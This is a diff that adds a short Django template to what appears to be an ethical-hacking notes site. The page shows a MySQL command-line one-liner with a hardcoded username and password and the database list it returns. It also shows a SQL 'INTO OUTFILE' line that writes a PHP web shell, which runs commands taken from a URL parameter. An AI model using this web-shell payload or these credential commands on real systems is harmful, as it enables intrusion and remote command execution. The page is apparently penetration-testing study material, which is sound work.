@@ -1,0 +1,27 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>OneLiner</h1>
+    <div class="code-box"><pre><code>.\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"
+______________________
+Database              |
+<u>gibbon</u>                |
+information_schema    |
+test                  |
+______________________|
+.\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" <u>gibbon</u> -e "show tables;"</code></pre></div>
+
+
+
+    <h1>OUTFILE function</h1>
+    <div class="code-box"><pre><code>SELECT '&lt;?php echo shell_exec($_GET["cmd"]); ?&gt;' INTO OUTFILE 'path';</code></pre></div>
+    <p class="text red">※You must select database to write.</p>
+</body>
+</html>
